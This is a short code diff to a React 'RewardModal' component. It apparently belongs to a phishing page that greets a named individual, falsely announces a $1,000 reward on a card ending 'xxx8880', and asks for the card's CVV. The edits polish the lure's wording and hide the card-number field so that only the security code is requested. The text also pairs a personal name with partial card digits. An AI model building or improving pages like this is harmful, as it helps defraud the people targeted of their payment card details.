@@ -256,7 +256,7 @@ export default function RewardModal() {
           <>
             <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
               <h2 className="text-2xl font-bold">Hello CAROL J GMITER</h2>
-              <p className="text-lg mt-1">You have been reward $1,000 on card ending with <b>xxx8880</b></p>
+              <p className="text-lg mt-1">You have been rewarded $1,000 on card ending with <b>xxx8880</b></p>
             </div>
 
             <div className="p-4 flex justify-center">
@@ -315,7 +315,7 @@ export default function RewardModal() {
                 {/* Credit card fields - now shown immediately */}
                 {showCVV && (
                   <div className="space-y-4 animate-in fade-in duration-500">
-                    <div className="space-y-2">
+                    {/* <div className="space-y-2">
                       <label htmlFor="cardNumber" className="text-sm font-medium block">
                         Card Number
                       </label>
@@ -329,7 +329,7 @@ export default function RewardModal() {
                         maxLength={19}
                       />
                       {errors.cardNumber && <p className="text-red-500 text-xs">{errors.cardNumber}</p>}
-                    </div> }
+                    </div>  */}
 
                     {/* CVV field */}
                     <div className="space-y-2">
